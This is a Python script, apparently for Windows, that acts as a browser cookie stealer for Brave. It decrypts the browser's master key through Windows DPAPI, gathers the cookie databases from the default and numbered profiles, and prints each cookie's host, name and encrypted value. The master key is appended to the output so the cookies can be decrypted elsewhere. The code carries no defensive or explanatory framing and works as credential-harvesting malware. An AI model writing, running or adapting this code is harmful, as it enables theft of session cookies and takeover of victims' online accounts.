import os
import sqlite3
import shutil
import json
import base64
import win32crypt

temp_db = "CookiesVault.db"

def get_master_key():
    local_state_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State')
    with open(local_state_path, "r", encoding='utf-8') as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:] 
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key


def find_cookie_dbs():
    base_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\BraveSoftware\Brave-Browser\User Data')
    candidates = ["", "Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]
    db_paths = []

    for folder in candidates:
        if folder:
            path = os.path.join(base_path, folder, r"Network\Cookies")
        else:
            path = os.path.join(base_path, r"Network\Cookies")

        if os.path.exists(path):
            db_paths.append((folder or "Default", path))

    return db_paths

if __name__ == '__main__':
    cookie_dbs = find_cookie_dbs()
    master_key=get_master_key()

    for profile, db_path in cookie_dbs:
        print(f"\n[+] Perfil: {profile}")
        shutil.copy2(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()

        cursor.execute("SELECT host_key, name, path, encrypted_value FROM cookies")
        data=""
        for index, cookie in enumerate(cursor.fetchall()):
            host = cookie[0]
            name = cookie[1]
            path = cookie[2]
            encrypted_value = cookie[3]

            data+=f"{index+1}|{host}|{name}|{encrypted_value.hex()}"
        data+=f"|{master_key.hex()}"
        print(data)


        cursor.close()
        conn.close()

        try:
            os.remove(temp_db)
        except Exception:
            pass



    

